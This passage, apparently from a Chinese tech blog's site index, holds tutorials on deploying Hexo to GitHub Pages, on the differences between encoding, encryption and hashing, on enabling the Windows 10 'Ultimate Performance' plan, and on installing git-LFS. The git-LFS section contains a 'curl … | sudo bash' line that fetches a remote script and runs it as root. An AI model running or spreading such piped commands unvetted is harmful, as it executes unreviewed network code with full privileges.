之間的關係","type":"posts"},{"content":"","date":"2021/05/15","externalUrl":null,"permalink":"/tags/github/","section":"Tags","summary":"","title":"Github","type":"tags"},{"content":"","date":"2021/05/15","externalUrl":null,"permalink":"/tags/hexo/","section":"Tags","summary":"","title":"Hexo","type":"tags"},{"content":"想要創建部落格，但又不想要一堆複雜又用不到的功能，輕盈的靜態頁面及 Git 版本控制，使用 Markdown 來撰寫文章，用 Hexo 架設部落格並發布在 Github Pages 這一切就是那麼容易且方便。\n評估自己部落格的需求 # 說到架設部落格，許多人會選擇使用「WordPress」這套網頁框架，雖然有著許多外掛功能及強大且方便的管理設計，但 WordPress 仍存在不少缺點\u0026hellip;\n檔案太肥\n因為強大的功能，導致整體檔案變得肥大笨重，在執行速度上並不出色。(尤其一堆功能其實根本用不到\u0026hellip;) 使用 PHP + MySQL\n乍聽之下好像不是什麼缺點，不過試問一下自己，真的有需要嗎？一旦牽扯到後端，一切都變得複雜。就好比接下來要說的安全性問題。 安全性\nWordPress 的安全問題一直都是個有待討論的議題。若是在 WordPress 重大漏洞被發現後沒有即時做更新，可能站點容易遭到攻擊者利用舊版本的漏洞攻擊，這會使得攻擊者可能獲取你的資料庫權限，文章也可能因此遭到竄改。這也就是我為什麼建議若非必要，盡量使用靜態頁面。 試想一下，架設部落格所需的功能有哪些？\n不外乎就是可以撰寫文章，並且將文章發布到網絡上供大家觀看。\n那麼我們是否其實可以在本地端撰寫文章後，用一些工具將文章渲染成靜態頁面？\n這麼一來不僅可以避免過於複雜的資安問題，也可以使網站架構變得更簡單。\nHexo 作為部落格的應用，就是這麼一個角色的存在。\n(當然，這麼做的缺點是，可能無法使你方便的在線上編輯文章)\n什麼是 Hexo ？ # 官方是這麼介紹的：\n「Hexo 是一個快速，簡單且功能強大的博客框架。您使用 Markdown (或其他標記語言) 撰寫文章，Hexo 會在幾秒鐘內生成帶有精美主題的靜態文件。(Hexo is a fast, simple and powerful blog framework. You write posts in Markdown (or other markup languages) and Hexo generates static files with a beautiful theme in seconds.)」。\nHexo 使用的是「Markdown」來撰寫部落格文章，這麼做的優點是，可以使你方便的對文章進行排版及以文字的方式快速的操作插件功能。\nHexo 會將這些 Markdown 的文章渲染成有序的 HTML 文件。並且在撰寫文章的過程中，Hexo 可以在本地端開啟伺服器，使你對自己的站點及文章做即時預覽。\n搭配「hexo-deployer-git」插件，可以將這些靜態頁面快速的佈署在你的 Github Pages 上。\n正式開始 # Step.1 安裝 Node.js 及 Git (如果已經安裝，請直接進入下個步驟) # 請確保你的環境有安裝 Git 及 Node.js 。\n注意：Node.js 版本若是太低，可能會在許多功能上不支援\n安裝 Git Windows：https://git-scm.com/download/win 下載並安裝 Mac：使用 Homebrew, MacPorts 或 安裝程式 安裝 Linux (Ubuntu, Debian)：sudo apt-get install git-core Linux (Fedora, Red Hat, CentOS)：sudo yum install git-core 安裝 Node.js\nNode.js 為大多數平台提供了官方的 安裝程序。對於中國大陸地區用戶，可以前往 淘寶 Node.js 鏡像 下載。\n又或者使用其他的安裝方式： Windows：通過 nvs (推薦) 或者 nvm 安裝。 Mac：使用 Homebrew 或 MacPorts 安裝。 Linux (DEB/RPM-based)：從 NodeSource 安裝。 其它：使用相應的軟件包管理器進行安裝，可以參考由 Node.js 提供的 指導 Step.2 安裝 Hexo # 使用 Node.js 進行下載\n1npm install -g hexo-cli 沒意外的話，將會進行好一段時間的安裝過程，請耐心等候。\n若安裝成功，應該可以使用以下指令顯示 Hexo 的版本：\n1hexo -v 若在安裝時顯示不存在 npm 指令，則表示可能你並未安裝成功 Node.js。\n試試以下指令來嘗試顯示 Node.js 版本，以此檢查是否有成功安裝：\n1node -v 2npm -v Step.3 初始化 Hexo # 安裝完 Hexo 之後，請先創建一個部落格目錄，進入該目錄中使用指令 npm install 將 Node.js 安裝在此以方便管理套件，之後使用 hexo init 初始化 Hexo 於該目錄。(所有部落格文件(包括插件)，將會存放在該資料夾中)\n1mkdir ~/MyBlog 2cd ~/MyBlog 3npm install 4hexo init 在 Hexo 初始化完畢後，應該會看到該目錄已經自動產生許多檔案。\n其中設定檔名為「_config.yml」。\n不過呢，暫時不動這些檔案，先嘗試將本地服務開啟：\n1hexo server 或者使用\n1hexo s 預設的 Port 為 4000，若成功運行，我們可以直接在瀏覽器訪問「localhost:4000」即可看到 Hexo 部落格頁面，及預設主題「Landscape」。\n圖源自: https://hexo.io/ 這麼一來就表示成功運作 Hexo 部落格啦！\nStep.4 設定 Hexo Config # 接著就可以開始自訂自己的部落格資訊及Hexo 主題了！\n編輯目錄下的 _config.yml ：\n1#_config.yml 2title: Alpaca-Tech 3subtitle: AlpacaBlog 4description: 這是一個 Hexo 部落格 5keywords: 6 - alpaca 7 - blog 8author: Alpaca0x0 9language: zh 10timezone: Asia/Taipei Option Description title 網站標題 subtitle 網站副標題 description 網站描述 keywords 網站的關鍵字，這有助於 Google SEO 的運作 author 您的名字，通常會用於顯示文章作者 language 網站使用的語言，參考 2-lettter ISO-639-1 code，預設為 en timezone 網站時區，Hexo 預設使用您電腦的時區，您可以在 時區列表 尋找適當的時區，例如 America/New_York 、 Japan 與 UTC 更多詳細設定可以在官方文檔中了解：https://hexo.io/zh-tw/docs/configuration.html\nStep.5 更換 Hexo 主題 # Hexo 是社群維護的，有著許多設計者開發的主題可以使你免費使用。\n可以在 https://hexo.io/themes/ 挑選自己喜歡的主題下載。\n將下載的主題放在部落格根目錄下的「themes/」目錄中。\n1mv ~/Download/butterfly/ ./themes/ #移動主題至 themes/ 目錄下 (ex. butterfly) 並且記得在 _config.yml 中設定使用的主題名稱 (下載的檔案名稱)：\n1#_config.yml 2theme: butterfly #主題名稱 (ex. butterfly) 再回到瀏覽器重新整理，應該就可以看到新的主題囉！\nps. 若是終端顯示錯誤訊息，很多時候是因為你沒有依照主題作者規定設定主題設定檔。\n主題設定檔通常位於目錄「themes/\u0026lt;主題名稱\u0026gt;/_config.yml」。\n不同主題設定檔檔名可能不同，再請自行前往該主題文檔查閱使用方式。\nStep.6 撰寫文章 # 於部落格根目錄下使用以下指令可以創建新文章：\n1hexo new \u0026#34;\u0026lt;文章名稱\u0026gt;\u0026#34; 值得注意的是，文章名稱要盡量避免特殊符號，以免渲染過程出現錯誤。\n而文章會生成在目錄「source/_posts/\u0026lt;文章名稱\u0026gt;.md」。\n附檔名為「.md」，開啟該檔案會發現這是一個「Markdown」檔。\n前面有提到，Hexo 部落格的文章是以「Markdown」來撰寫的。\n可以在文章的開頭設定一些基本資訊，例如標題、分類、標籤\u0026hellip;等\n1title: 如何使用 Hexo 在 Github 上部署部落格？ 2categories: 3 - 教學 4tags: 5 - Hexo 6 - Blog 7keywords: 8 - hexo 9 - blog 10 - 部落格 11 - github 12date: 2021-05-13 15:38:36 13description: \u0026#34;這是一則關於文章的簡要說明\u0026#34; 開始撰寫文章內容：\n1## 標題 2這是一則內容... 3第二行... 4 5### 更小的標題 6插入一張圖片 7![圖片說明](image.png) 更多 Markdown 語法請查閱 https://markdown.tw/ 。\nStep.7 創建 Github Pages # 如果你不知道什麼是「Github」，那可能要先了解一下。\n簡單來說，它是透過 Git 進行版本控制的軟體原始碼代管服務平台。詳情請見 Wiki 維基百科\n而「Github Pages」是就是「Github」所提供的一個網頁代管服務，我們可以將部落格交給 Github Pages 來代管。(注意，Github Pages 只能託管靜態網站)\n先請按照官方指示，建立一個 Github Pages 。\n創建名為「username.github.io」的 Repositories 。\nStep.8 設定 Hexo 的推送設定 # 首先要先安裝 Hexo 的 hexo-deployer-git 插件。\n於部落格根目錄輸入以下指令安裝：\n1npm install hexo-deployer-git --save 安裝完畢後編輯設定檔「_config.yml」：\n1#_config.yml 2deploy: 3 type: git 4 repo: http://github.com/alpaca0x0/alpaca0x0.github.io 5 branch: dev 6 message: Site updated: {{ now(\u0026#39;YYYY-MM-DD HH:mm:ss\u0026#39;) }}) 由於我們要推送至「Github Pages」，因此 type 設定為 「git」。 其中 repo 為 「Repositories」，此指要部署的目的地。 而 branch 則是分支，可以不做此設定(使用預設分支)。 最後 message 則是提交訊息，此項同樣可以不做設定。 另外，這是允許一次部署多個站點的(如果有需要的話)：\n1deploy: 2 - type: git 3 repo: ............ 4 - type: heroku 5 repo: ............ Step.9 佈署到 Github Pages # 渲染靜態網頁：\n1hexo generate #或者使用縮寫 hexo g 生成完之後就可以部署站點了：\n1hexo deploy #或者使用縮寫 hexo d 接著輸入 Github 帳號密碼即可成功部署。\n如果嫌每次都要輸入帳號密碼很麻煩，也可以使用 Github 提供的 SSH 方法來連接。\n更據官方格式將 _config.yml 中的佈署設定 deploy 裡面的 repo 改為對應的 SSH 連結。\n詳情請見 Github 官方文檔\n你也可以直接輸入以下指令來 渲染檔案並部署站點：\n1hexo g -d 這麼一來就大功告成啦～\n另外 hexo clean 可以清理暫存檔案，使站點重新抓取資料及設定。\n參考資料 # 《Hexo Documentation》https://hexo.io/docs/\n","date":"2021/05/15","externalUrl":null,"permalink":"/posts/how-to-deploy-hexo-on-github-pages/","section":"","summary":"\u003cp\u003e想要創建部落格，但又不想要一堆複雜又用不到的功能，輕盈的靜態頁面及 Git 版本控制，使用 Markdown 來撰寫文章，用 Hexo 架設部落格並發布在 Github Pages 這一切就是那麼容易且方便。\u003c/p\u003e","title":"如何使用 Hexo 在 Github Pages 上部署部落格？","type":"posts"},{"content":"","date":"2021/04/20","externalUrl":null,"permalink":"/series/cryptography/","section":"Series","summary":"","title":"Cryptography","type":"series"},{"content":"","date":"2021/04/20","externalUrl":null,"permalink":"/tags/cyber-security/","section":"Tags","summary":"","title":"Cyber Security","type":"tags"},{"content":"","date":"2021/04/20","externalUrl":null,"permalink":"/tags/digital-signature/","section":"Tags","summary":"","title":"Digital Signature","type":"tags"},{"content":"Encode (編碼)、Encrypt (加密)、Hash (雜湊) 一直令許多新手們搞混，雖然說可能運算後的結果看起來都是一串亂碼，但原理及使用場合卻天差地遠，千萬不要再分不清處了！\nEncode (編碼) # 在計算機中，需要儲存大量資料，而這些資料基於各國的語言不同，可能是基本的英文或是博大精深的中文，中文又分簡體、繁體，甚至是由右至左書寫的阿拉伯文等。\n雖然各種國家的文字零零種種非常多，尤其中文數量更是大的驚人，但這些文字對計算機來說都只是「字元」，更精確來說都只是機器語言，也就是常聽見的「0、1」，所以儲存上並難不倒它，問題就出在，如何在存放與顯示之間做格式的轉換？\nASCII # 舉例剛開始美國人使用的編碼「ASCII」，全名「American Standard Code for Information Interchange (美國資訊交換標準代碼)」，主要是用來顯示基本的 阿拉伯數字、26 個英文字母(大小寫)、英式標點符號。但這很快就使得在其他語系的國家顯示上出現問題，例如西歐語言就無法套用在 ASCII 上。\n1968年版ASCII編碼速見表｜圖源自 Wiki 維基百科 雖然後來也使用 EASCII 解決了部分西歐語言的顯示問題，但還是有著各式各樣的語言在顯示上有問題，這也是導致為什麼會有那麼多種編碼的原因之一，儘管有著這麼多的編碼，但也出現了一個新的問題「如何統一」？直到「Unicode」被發明。\nUnicode (UTF) # 「Unicode」簡稱「UTF」又稱「萬國碼、統一碼」，是一種被大家公認的標準編碼。\n它最大的優點在於，該編碼納入了世界上大部分的文字系統，也就是將那些雜亂的編碼給統整了，所以其實它是一種「編碼集」，這也就使得計算機能夠更簡單方便的呈現和處理文字。\n說了這麼多，你可能已經發現，名詞「Encode (編碼)」其實就只是在指資料的格式，放在動詞上解釋就只是轉換資料格式的過程。因此，編碼僅僅只是將文字轉換成不同格式做儲存、顯示等，並無實質上的加密作用。\nDecode(解碼) # 基本上就是將 Encode(編碼) 過後的資料做反向編碼的動作。\n其實從字面上意思也不難理解「編」與「解」所表達的含意，就像是加工與還原般。\nEncrypt (加密) # 基於資料的隱私及安全性考量，在許多時候我們不得將資料給加密以確保資料內容不被輕易讀取。\n但要特別在此聲明的一點是，這裡所指的「Encrypt (加密)」並非是大家常使用的「帳號、密碼」系統。\n以往我們不希望他人讀取自己較私人的訊息時，我們會在這些資料被讀取前請求驗證身份，舉例將檔案放在保險箱中，若是密碼不正確則無法開啟保險箱，藉此達到資料不被讀取的安全功能。\n理論上沒問題，但這其實有個致命的缺點\u0026hellip; 如果鎖被破壞呢？\n萬一有些方法能破壞這些鎖，進而達到不用輸入密碼也能存取的動作，那這種加密豈不是失去作用了。\n會導致這樣的原因主要是因為，這些聲稱加密的檔案其實並沒有被真正的「加密運算」，只是在外層加上了一道防護而已。而安全的加密應該是連同裡面的資料進行改變，這麼一來若是無法有相對應的金鑰，則無法解密資料。\n可以想像成 Encrypt (加密) 就是將 Encode (編碼) 中融入了 Key (密鑰) 及 Algorithm (演算法) 的元素，使 Key (密鑰) 參與了這整個利用 Algorithm (演算法) 轉換格式的過程，因此若是缺少 Key (密鑰) 是無法反推算原始含意的。\n而加密的方式有成千上萬中種，大致上可以分成兩類，分別是「Symmetric-key algorithm (對稱加密)」及「Asymmetric Cryptography (非對稱加密)」。\n對這部份想更深入了解的朋友可以看看我之前寫的文章「」及「」。\nDecrypt (解密) # 指對於「Encrypt (加密)」過的檔案使用對應的 Key(密鑰) 進行反運算以得出原本內容的過程。\nHash (雜湊) # 相較於上述的 Encode (編碼) 及 Encrypt (加密) 來說，Hash (雜湊) 算是個特別的存在。\n直接道出重點的話就是「Hash (雜湊) 是不可逆的」。\n可逆性 (Reversibility) # 顧名思義就是可以逆向回朔原始狀態的意思。與其相反的詞為「不可逆性 (Irreversibility)」。\n好比上述的「Encode (編碼)」，基本上各式各樣的編碼方式及編碼對應表在網絡上都可以搜尋的到，也就表示任何人都可以對這些編碼進行解碼的動作，因為方法是公開的。(當然，自創的編碼例外)\n再者，「Encrypt (加密)」也可以被持有「Key (密鑰)」者透過「Decrypt (解密)」的動作還原出原始的含意。\n這些可以被成功回朔至原始含意的都代表含有 可逆性 (Reversibility)。\n不可逆性 (Irreversibility) # 與上述的可逆性 (Reversibility)擁有相反性質，表示無法單純透過字串或亂碼追朔其原始含意。\nHash (雜湊) 就是這樣的存在。\n那麼是如何做到 不可逆性 (Irreversibility) 的呢？\n破壞性的運算 # 有著可逆性 (Reversibility)的主要原因是因為其內容依舊被「完整的保留」，只是換了種儲存方式而已。但Hash (雜湊)則不會如此，也就是說 Hash (雜湊) 會將原始的資料給破壞保存。\n舉個例子，我們都知道的除法。\n除法「16 / 8」會等於「2」，若試問你「X / 8」結果為「2」，你依然能透過「2 * 8」得出 「X = 16」，因為「除法」可以被理解成是「乘法的反運算」。\n這個道理大家都懂，那麼若是取餘數呢？(或說是取模數)\n舉例「16 Mod 4」會是「0」，因為 16 能被 4 整除。\n而「16 Mod 5」則會是「1」，問題來了，若試問你「X Mod 5」結果為「1」，你能推出「X」的值嗎？\n這可能的值將有無限多種，你無法光靠保留下來的資訊推算原始內容，因此就可以達到 不可逆性 (Irreversibility) 的效果。\n這只是其中一個簡單的例子，而 Hash (雜湊) 中含有各種類似的概念以確保運算後的結果不能被反推。\n並且 Hash (雜湊) 有著特點，就是當輸入的內容相差了哪怕只有一點，也會導致雜湊結果截然不同。\n舉例「alpaca blog」的 SHA-256 雜湊為「58e93956c3cc49342b607a931e4fd60e37518d7f21f29e1dfc968d4be98c976a」。那在後面加個小點變成「alpaca blog.」的 SHA-256 會是長怎樣呢？\n答案是「3e445a9b450005d71ce28992d24871ddd5bcf5495a6eb52d3fe91f594cf3c35d」。\n完全不同的結果，若要分析破解雜湊值根本無跡可尋。\n但也因此，其實雜湊是「可能會重複」的！\n畢竟即使擁有「2^256+1」種可能性的 SHA-256 也不能裝下第「2^256+2」種輸入還不產出重複的輸出結果吧！\n只是很難找到重複的兩筆資料，因為實在是太多種可能性了！\n即使找到了，但也很難是有意義的資料，通常是亂碼，這也可以使人為修改幾乎成為不可能的事情。\n(ps. 許多雜湊是不論輸入的字串長度多長，輸出的長度皆相同的。舉例「SHA-256」就是輸出 256 bits，大小寫英文及數字，字元長度為「64」，而 MD5 則固定輸出 128 bits，大小寫英文及數字，字元長度為「32」。)\n大致上都了解雜湊的特性了\n那麼問題來了，什麼情況下我們會需要將資料 Hash (雜湊) ？\n既然不能被還原，那要那串雜湊過後的亂碼有什麼用？\n驗證資料完整性 # 由於基本上很難找到兩筆有意義的重複雜湊值，因此就可以透過此方式來驗證檔案的完整性。\n舉例「虛擬貨幣」就使用這點來驗證每筆交易的可信度，又或者你可能在下載某些檔案時，就曾看過官方在該檔案旁標示的「識別亂碼」，就是使用雜湊的原理。\n常見的雜湊就有「SHA-1、SHA-256、MD5」等。\n每個在計算機上的「File (檔案)」不論是 mp3、mp4、txt、jpg、png、gif 等，對電腦來說都只是一串很長的文字，更精確來說都只是 0 與 1。\n既然如此，那麼我們就可以將檔案進行雜湊運算！\n有什麼用處？\n試想一下，是否曾經聽過駭客入侵網站後，將原有的檔案竄改加入病毒使他人下載並執行到被加工檔案的事件。若是有個機制能檢測檔案是否遭到竄改，但過程又不必要去比對整個檔案的內容(太耗效能資源)，該怎麼做？\n看看上面的 Hash (雜湊) 特性，就不難理解它可以有效的做到這點。\n官方在釋出檔案的同時，附上一段該檔案的雜湊值及雜湊演算法，使用者下載了該檔案後，可以自己將檔案再次經過雜湊後比對是否跟官方所附上的雜湊值一致，若不一致表示該檔案被竄改過！\n例如 bitcoin.org 網站提供大家下載「bitcoin core」比特幣錢包。\n並且付上了對於檔案的數字簽名。\n內容大致上長這樣：\n-----BEGIN PGP SIGNED MESSAGE----- Hash: SHA256 43416854330914992bbba2d0e9adf2a6fff4130be9af8ae2ef1186e743d9a3fe bitcoin-0.21.0-aarch64-linux-gnu.tar.gz f028af308eda45a3c4c90f9332f96b075bf21e3495c945ebce48597151808176 bitcoin-0.21.0-arm-linux-gnueabihf.tar.gz 695fb624fa6423f5da4f443b60763dd1d77488bfe5ef63760904a7b54e91298d bitcoin-0.21.0-osx64.tar.gz 6223fd23d07133a6bfa2aa3d2554a09dc1d790d28ce67b0085d3fdcc1c126e05 bitcoin-0.21.0-osx.dmg f8b2adfeae021a672effbc7bd40d5c48d6b94e53b2dd660f787340bf1a52e4e9 bitcoin-0.21.0-riscv64-linux-gnu.tar.gz 1a91202c62ee49fb64d57a52b8d6d01cd392fffcbef257b573800f9289655f37 bitcoin-0.21.0.tar.gz 54050748ef4d4f000ea1ece472491b3e5fd546efc74ed52119354b2893f6624b bitcoin-0.21.0-win64-setup.exe 1d0052c4ce80227fb6d0bc1c4e673ba21033e219c1f935d25f130ef7f43360d4 bitcoin-0.21.0-win64.zip da7766775e3f9c98d7a9145429f2be8297c2672fe5b118fd3dc2411fb48e0032 bitcoin-0.21.0-x86_64-linux-gnu.tar.gz -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.11 (GNU/Linux) iQIcBAEBCAAGBQJgADqTAAoJEJDIAZ42wulkjtkQAJwlSTDinKsxZIMky3MeVhwB CmxxYiMLPQA8bwgxyc4RaTxUrqL2oExPOtfcDzcR1WbQe12niG40N/2yrtf66lG9 KbSsQD6nKat9B3mCk9/jNkJHWmq5JJbOyfRs2mex75Lj7UHaPPrqh2rMfEewljed kHkDuaqeqYlTAh981WqLD+l5jnpQZqBSrcz3YTTvXWd7xKfFSVzqF/tD4CQFrPX2 9b2BLzA/u+29Z3s+zio1l5c7fikNDd404T5U/y+NMOyCmgT4eiDGLQPlEpoGNq3w GYU7FNZUO9xXeatx4PI8qiq5mIK46UwfPUTeruTzNrHsME7YioUa87uSYKM8jqwP FSnbhYoUqCB/wPaKZwEF+2WzG88yj2+PzalVt8cnjRnTQ77COtHJqs8AjLWnVACF LluplM16xyiLn0FWkrEHyi5HlI+X+cqIiTtehojMBXIkHugIYMnT5XB9llh5OWXg Bp1UGupojLXYuMNF5R6cU5Iq+xJjbUiQ/PDm38MBlFlQ9RzRCYyZpMYZE3K9p789 jpjdYdMPtzkYlIKD87S89JtE1s6i/SkTPhebyu/328rqkqnNKSCHnuB7Fy2iEKJj 5kLs/LjY8yxSMuGeNl6LhWGKVZKy0AS/BztSHr2jgThfhN1BemFRcViSvcXhMeNw ka8Z9KLt/N0ziabBexAw =bi4p -----END PGP SIGNATURE----- 在第二行的位置，官方標示了「Hash 方式為 SHA256」，接著就列出了各個檔案的雜湊值供大家驗證，可是該文檔也是可能受到偽造的，那怎麼辦？\n還記得前面所說的「非對稱加密」嗎？在此情境當中被用在了「數字簽名」，並且將簽章寫在文檔最後，也就是最後那串很長的亂碼。\n官方將前面的整段「BEGIN PGP SIGNED MESSAGE 與 -----BEGIN PGP SIGNATURE----- 中間」的內容給簽章成「-----BEGIN PGP SIGNATURE----- 與 -----END PGP SIGNATURE----- 中間」的那串亂碼了！你只需要使用官方提供的公鑰便可以驗證這一切的資訊是否源自官方。\n萬一駭客更改了檔案，則無法通過該文檔的 Hash (雜湊) 驗證，若駭客連該文檔一起修改，將檔案對應的雜湊值也更改了，但由於駭客沒有官方所釋出的公鑰所對應的私鑰，因此也無法對修改後的訊息進行官方簽章。\nHash (雜湊) 其實可以被破解？ # 雜湊也並非無敵，它只是盡量的避免了原文被修改成其他有意義的內容，藉此達到降低被欺騙的可能而已。\n有些網站標榜能破解 Hash (雜湊)，那其實是利用大數據來進行比對，尋找雜湊值是否存在於曾經被紀錄的雜湊值與其對應的原文中，「暴力攻擊 (Brute-force attack)(又稱 窮舉攻擊 (Exhaustive attack) 或 爆破)」或者「彩虹表 (Rainbow Table)」。\n暴力攻擊 (Brute-force attack)\n暴力攻擊其實就是以「窮舉」的方式來找出該雜湊值對應的明文，因此需要嘗試許多種的可能性，也非常耗時，通常不太會真正的窮舉，畢竟可能性太多了。\n假設我們是要利用該方法來找出某一串「已知是人工輸入的密碼的雜湊值」的明文，那只要我們可以收集許多常見密碼的列表，就可以使用這些列表來嘗試，萬一該密碼有在列表中，就可以成功找到比對一致的結果。而這種方式依賴的那個裝著許多待比對的字串的檔案我們稱它為「字典檔」。\n將字典檔中的各項可能結果使用腳本或特定程式一個個的雜湊後，再去比對是否有與欲破解的雜湊值有相符結果，若沒有則繼續嘗試下一筆資料，若成功批配，則表示該項就是(幾乎是)該雜湊值的原文，同時我們也稱這種雜湊過後得出相同值的狀況為「發生碰撞」。 彩虹表 (Rainbow Table)\n嚴格來說也算是一種暴力攻擊的方式，但在某些時候效率比暴力攻擊更高。\n通常是指將雜湊的公式逆向運算回推所預先計算好的表。在密碼學打滾的人一定都知道這個！\n關於彩虹表的原理解釋相對較複雜，簡單來說就是\u0026hellip; 假設原本的雜湊函式為 H，則創建一個與其對應的相反函式 R 又稱「歸約函式 (Reduction function)」。函式 R 可以將利用函式 H 所計算出的雜湊值反算回與原本格式類似的亂碼，這裡也可以理解成是將這雜湊值 Hash 成 新雜湊值，而這個新雜湊值格式是類似原文的格式。就這樣持續的經過 R 運算、H 運算、R 運算、H 運算\u0026hellip; 形成了一條很長的鏈，由於這條鏈的結果是必然的，因此只需要對該鏈的初始節點及末端節點儲存即可。\n假設原文為「aaaaaa」在經過 H 運算 之後雜湊值為「281DAF40」，則我們將該雜湊值用 R 運算 得出一個反雜湊值為「sgfnyd」之後再進行一次 H 運算 得出「920ECF10」再進行 R 運算 得出「kiebgt」，之後將這條鏈存入表中(只存頭尾節點)。過程如下圖：\n圖源自 Wiki 維基百科 若欲破解的雜湊值所運算出的雜湊鏈中的任意節點與表中的某項末端節點發生碰撞，就可以由該鏈的初始節點開始嘗試重建對應的雜湊鏈。\n延續剛剛的情境，假設欲破解的雜湊值為「920ECF10」，在使用 R 運算 後得出「kiebgt」。\n圖源自 Wiki 維基百科 我們發現該值出現在表中，於是我們將該鏈的初始節點開始進行 H 及 R 運算 直到找出「920ECF10」為止，若成功找到，則表示該鏈中的「920ECF10」的前個節點便是解，即為下圖的「sgfnyd」。\n圖源自 Wiki 維基百科 但由於剛剛說過，雜湊是可能會重複的，因此在此情境中，即便「kiebgt」在表中的某項末節點被找到，但也可能發生當你嘗試利用該鏈的初始節點開始進行運算後，也無法找到「920ECF10」的狀況，對此我們稱作「誤報 (False alarm)」，接著只需要跳過該次批配，繼續做運算嘗試找出下個配對即可。\n舉例上述情境可能在「FB107E70 (不同的雜湊值)」進行 R 運算 後得出「kiebgt (有著一樣的雜湊)」。\n圖源自 Wiki 維基百科 總結 # 只能說現在在資訊安全上真的衍生出了許多方法，這些方法能有著許多優點，但同時也能帶來許多危機。\n在寫這篇文章時，寫著寫著突然發現好像重心著重在 Hash (雜湊) 的部份太多了，造成各位在觀看時可能有點失去平衡，真的很抱歉，但這也是因為我希望將較完整的資訊帶給各位。\n文章內容較為繁瑣，也有些許離題。資料都是自己的知識及 Wiki 維基百科 的輔助！\n若內容有誤請不吝嗇通知我，非常感謝！\n另外喜歡這篇文章也別忘了分享給你身邊的朋友觀看！\n參考資料 # 《Wiki 維基百科 - ASCII》https://zh.wikipedia.org/wiki/ASCII\n《Wiki 維基百科 - Unicode》 https://zh.wikipedia.org/wiki/Unicode\n《Wiki 維基百科 - SHA-2》https://zh.wikipedia.org/wiki/SHA-2\n《Wiki 維基百科 - MD5》https://zh.wikipedia.org/wiki/MD5\n《Wiki 維基百科 - 蠻力攻擊》https://zh.wikipedia.org/wiki/%E8%9B%AE%E5%8A%9B%E6%94%BB%E5%87%BB\n《Wiki 維基百科 - 彩虹表》https://zh.wikipedia.org/wiki/%E5%BD%A9%E8%99%B9%E8%A1%A8\n","date":"2021/04/20","externalUrl":null,"permalink":"/posts/encode-encrypt-hash/","section":"","summary":"\u003cp\u003eEncode (編碼)、Encrypt (加密)、Hash (雜湊) 一直令許多新手們搞混，雖然說可能運算後的結果看起來都是一串亂碼，但原理及使用場合卻天差地遠，千萬不要再分不清處了！\u003c/p\u003e","title":"Encode、Encrypt and Hash are different！","type":"posts"},{"content":"你還不知道 Windows 10 的「終極效能」模式嗎？嫌電腦變慢不如試試這個！ 什麼是「Ultimate Performance (終極效能)」 # 微軟在 Windows 10\u0026rsquo;s April 2018 Update 中添加了「Ultimate Performance (終極效能)」這樣一個模式，最初該更新被命名為「Spring Creators Update」，也正式從 Win-10 1803 版本後開始可以使用該模式。\nUltimate Performance (終極效能) 是一種「電源計劃」。\n可能有些人早就知道，Windows 10 提供我們選擇電源計劃的功能，在 Power Options (電源選項) 中，沒意外一般的電腦只會出現最多三種選項，分別是：\nBalanced (平衡): 讓為你自動調整效能，使耗電與效能平衡。 Power Saver (省電): 降低系統的效能以節省電源。 (通常是筆記型電腦處於低電量時系統自動開啟) High Performance (高效能): 消耗更多的電力，讓系統發揮更高的效能。 而 Ultimate Performance (終極效能) 則是比 High Performance (高效能) 模式的效能來的更強。\n欸？可是沒看到 Ultimate Performance (終極效能) 呀？\n別急，因為這個模式預設是給 Windows 10 Pro 使用的，其他版本的用戶是需要手動開啟的！\n開啟 Ultimate Performance (終極效能) # Step.1 開啟 Powerline # 按下左下角的 Windows 圖示叫出選單。\n(你也可以按下鍵盤的 Win 鍵，如下圖，大概在左邊的Ctrl與Alt旁邊)\n這是選單的樣子:\n當選單跳出時，請直接在鍵盤輸入「powershell」。(ps. 注意輸入法要調整成英文)\n圖取自 Wiki 維基百科 正常來說會找到這樣的 Logo，並寫著「Power Shell」字樣的程式:\n對它點擊 滑鼠右鍵 \u0026gt; 以系統管理員身份執行。\n沒意外應該會出現類似這樣籃底白字的視窗 (注意左上角應該要出現系統管理員字樣):\nStep.2 輸入指令 # 首先複製以下這段指令:\n1powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 接著到剛剛的Power Shell視窗中，按下滑鼠右鍵貼上後按下Enter。\n如果看到系統回應你如上圖的資訊，\n那麼恭喜你成功激活 Ultimate Performance (終極效能) 模式！\n但注意！這時候還沒啟動它。\n如果系統沒有回應該訊息，那或許是 指令輸入錯誤 ，請再確認輸入是否正確。\n並且請確認 Power Shell 是以 管理員身份開啟 。\n如果以上都做到了，還是不能，那很有可能是電腦版本不支援這個模式，前面有說到，Windows 的版本必須是 1803 以上 。\nStep.3 啟動 Ultimate Performance (終極效能) # 跟剛剛一樣，在按下 Win 鍵叫出選單後，直接在鍵盤輸入「control」。\n如果右方有出現「電源選項」則直接點選，並跳至步驟 3-4\n沒有出現的話就點擊 控制台 :\n點選「硬體與音效」\n點選「電源選項」\n有出現電源選項直接跳至這裡 # 在這裡就可以看到下方出現「終極效能」的選項了！直接選取即可。\n(ps. 如果沒出現選項，那可能是被隱藏了，請點選右方按鈕)\n完成 # 這麼一來就完成了！\n但注意唷，建議如果沒有這個需求的朋友們平時不要開著這個模式，這會導致沒必要的耗電(夏天電費很貴 QQ)\n最後，如果這篇文章有幫助到你，那也請不吝嗇轉發分享給你的朋友們看唷！\n","date":"2021/04/06","externalUrl":null,"permalink":"/posts/windows10-ultimate-performance/","section":"","summary":"","title":"一招啟動 Windows 10 「終極效能」！讓你的電腦瞬間活起來！","type":"posts"},{"content":"使用 git push 推送檔案到 Github 上時，被告知檔案太大無法推送！？馬上教你怎麼解決！\n報錯 # 當你嘗試使用 git push 推送超過100 MB的檔案時，沒意外就會收到這樣的錯誤。\n這是因為 Github 一個檔案最大上傳限制就是100 MB。(ps. 分開上傳可以，但不能同個檔案 100 MB)\n1$ remote: error: GH001: Large files detected. 2$ remote: error: Trace: xxxxxxxxxxxxxxxxxxxx 3$ remote: error: See http://git.io/iEPt8g for more information. 4$ remote: error: File xxxxxxxxxxxxx is 101.00 MB; this exceeds GitHub\u0026#39;s file size limit of 100 MB 安裝 Git-LFS 解決！ # 為此 Github 也提供解決方法 - 「Large File Storage」。\nDebian and Ubuntu # 1curl -s https://packagecloud.io/install/repositories/github/git-lfs/script.deb.sh | sudo bash 2sudo apt-get install git-lfs 3git lfs install Mac OSX # 1brew update 2brew install git-lfs 3git lfs install RHEL/CentOS # Step.1 安裝 git \u0026gt;= 1.8.2 # 如果你的版本是 RHEL/CentOS 5 或 7 (而不是 6)的話：\na. 